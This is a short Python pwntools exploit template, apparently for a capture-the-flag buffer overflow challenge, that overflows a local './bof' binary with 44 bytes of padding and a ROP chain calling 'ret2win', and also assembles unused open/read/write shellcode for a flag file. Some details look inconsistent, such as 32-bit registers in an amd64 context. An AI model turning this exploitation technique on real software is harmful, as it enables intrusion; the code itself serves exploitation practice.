#!/usr/bin/env python3

from pwn import *

context.update(
    arch="amd64",
    endian="little",
    os="linux",
    log_level="debug"
)

elf = ELF("./bof")
libc = ELF("./libc.so")

def connect():
    return process(elf.path)
    # return remote("pwning.net", 1337)

def wait(p):
    pid = util.proc.pidof(p)[0]
    print('r2 -d ' + str(pid))
    util.proc.wait_for_debugger(pid)

def attach(p):
    bkps = [elf.symbols["main"], ]
    cmds = []
    gdb.attach(p, '\n'.join(["break *{:#x}".format(x) for x in bkps] + cmds))

def exploit(p):
    rebase = lambda x: p64(x + 0x40000)

    # Create a ROP object
    rop = ROP(elf)
    rop.call(elf.symbols['ret2win'], [1, 2, 3])

    # Open/Read/Write
    shellcode = asm(shellcraft.open('/home/orw/flag', 0, 0) +
                    shellcraft.read('eax', 'esp', 0x64) +
                    shellcraft.write(1, 'esp', 0x64))

    # Offset into vulnerable buffer
    # Determine with:
    #   > cyclic(200)
    #   > cyclic_find(eip)
    offset = 44

    payload = 'A' * offset
    payload += str(rop)

    p.clean()
    p.sendline(payload)
    p.interactive()

p = connect()
exploit(p)
